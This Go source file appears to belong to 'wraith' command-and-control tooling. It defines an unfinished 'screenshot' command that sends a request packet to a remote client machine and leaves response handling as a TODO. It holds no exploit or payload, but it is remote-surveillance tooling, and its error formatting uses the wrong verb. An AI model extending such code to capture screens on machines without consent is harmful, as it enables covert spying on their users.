package snippets

import (
	"fmt"
	"strings"

	"dev.l1qu1d.net/wraith-labs/wraith-module-pinecomms/cmd/pc3/lib"
	"dev.l1qu1d.net/wraith-labs/wraith-module-pinecomms/internal/proto"
)

func snippetScreenshot(ctx lib.CommandContext, arg string) (string, error) {
	target, _, _ := strings.Cut(arg, " ")
	response, err := sendRRToClientAwaitResponse(ctx, target, &proto.PacketRR{})
	if err != nil {
		return "", fmt.Errorf("failed to execute screenshot snippet for client `%s` due to error: %e", target, err)
	}

	// TODO: Parse response and send the screenshot.
	return "", nil
}
